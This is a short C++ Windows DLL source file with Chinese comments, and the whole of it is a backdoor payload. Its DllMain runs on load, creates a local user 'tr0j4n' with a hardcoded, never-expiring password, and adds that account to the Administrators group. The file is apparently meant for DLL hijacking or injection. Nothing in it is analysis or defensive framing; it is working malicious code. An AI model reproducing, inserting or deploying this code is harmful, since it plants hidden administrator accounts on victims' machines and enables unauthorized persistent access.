// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <windows.h>
#include <lm.h>
#pragma comment(lib,"netapi32") 

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	USER_INFO_1 ui;
	DWORD dwError = 0;
	ui.usri1_name = (TCHAR *)L"tr0j4n";
	ui.usri1_password = (TCHAR *)L"biweilun";
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_DONT_EXPIRE_PASSWD | UF_PASSWD_CANT_CHANGE;;//用户不能更改密码，密码永不过期
	ui.usri1_script_path = NULL;
	NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
	wchar_t szAccountName[20] = { 0 };
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		const wchar_t *name;
		name = (const wchar_t *)L"tr0j4n";
		wcscpy_s(szAccountName, name);
		LOCALGROUP_MEMBERS_INFO_3 account;
		account.lgrmi3_domainandname = szAccountName;
		NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
